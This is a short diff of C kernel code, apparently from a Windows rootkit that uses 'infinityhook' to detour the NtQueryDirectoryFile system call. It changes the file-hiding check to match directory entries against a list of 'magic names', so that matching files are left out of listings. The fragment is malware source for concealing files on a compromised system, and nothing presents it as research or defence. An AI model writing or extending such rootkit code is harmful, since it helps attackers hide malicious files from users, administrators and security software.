@@ -63,7 +63,8 @@ NTSTATUS DetourNtQueryDirectoryFile(
 					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
 				}
 				kprintf("[+] infinityhook: NtQueryDirectoryFile: FileNameLength: %d, FileNameBuffer: %ws\n", FileInformationPtr->FileNameLength, FileNameBuffer);
-				if (wcsstr(FileNameBuffer, Settings.NtQueryDirectoryFileExMagicName)) {
+				//if (wcsstr(FileNameBuffer, Settings.NtQueryDirectoryFileExMagicName)) {
+				if (matchMagicNames(FileNameBuffer, (Target)TARGET_FILE)) {
 					kprintf("[+] infinityhook: NtQueryDirectoryFile: SHOULD HIDE: %ws\n", FileNameBuffer);
 
 					// Not the last one
